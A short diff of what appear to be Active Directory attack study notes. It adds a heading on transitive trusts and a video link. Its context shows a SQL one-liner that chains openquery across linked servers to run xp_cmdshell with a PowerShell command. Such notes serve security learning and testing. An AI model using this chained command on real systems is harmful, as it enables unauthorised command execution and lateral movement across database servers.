@@ -943,6 +943,8 @@ OR via SQL:
 ```
 select * from openquery("dcorp-sql1",'select * from openquery("dcorp- mgmt",''select * from openquery("eu-sql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
 ```
+#### Transitive and Shortcut Trusts, Pepe Silvia, and Enterprise Admins. 
+https://www.youtube.com/watch?v=S5Glfe6UeXQ
 
 
 
